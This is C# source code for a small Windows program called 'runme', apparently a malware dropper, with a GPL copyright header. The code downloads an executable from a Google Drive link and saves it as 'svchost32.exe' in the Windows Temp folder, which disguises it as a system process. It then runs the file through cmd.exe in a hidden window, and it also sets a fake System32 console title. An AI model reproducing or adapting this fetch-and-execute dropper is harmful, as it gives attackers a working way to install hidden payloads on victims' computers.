using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Diagnostics;
using System.Threading;

namespace runme
{
    class Program
    {
        static void Main(string[] args)
        {
            // Copyright (C) 2020 L0LERMAQN12

            // This program is free software: you can redistribute it and/or modify
            // it under the terms of the GNU General Public License as published by
            // the Free Software Foundation, either version 3 of the License, or
            // any later version.

            // Credit to sparky for the support

            try
            {
                Console.Title = @"C:\Windows\System32\sysdrop32.exe";
                WebClient client = new WebClient();
                client.DownloadFile("https://drive.google.com/u/0/uc?id=1cc6eiF_CDWfRwJ-0Y7ke3rup7Nk87i2l&export=download", @"C:\Windows\Temp\svchost32.exe");
            }
            catch
            {
                Console.WriteLine("No internet connection/Application Error");
                Console.Beep();
                Thread.Sleep(700);
                Environment.Exit(0);
            }
            Console.WriteLine("File Dropped succesfully");
            Thread.Sleep(600);
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = @"cmd.exe";
            ps.Arguments = @"/c C:\Windows\Temp\svchost32.exe";
            ps.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(ps);
        }
    }
}
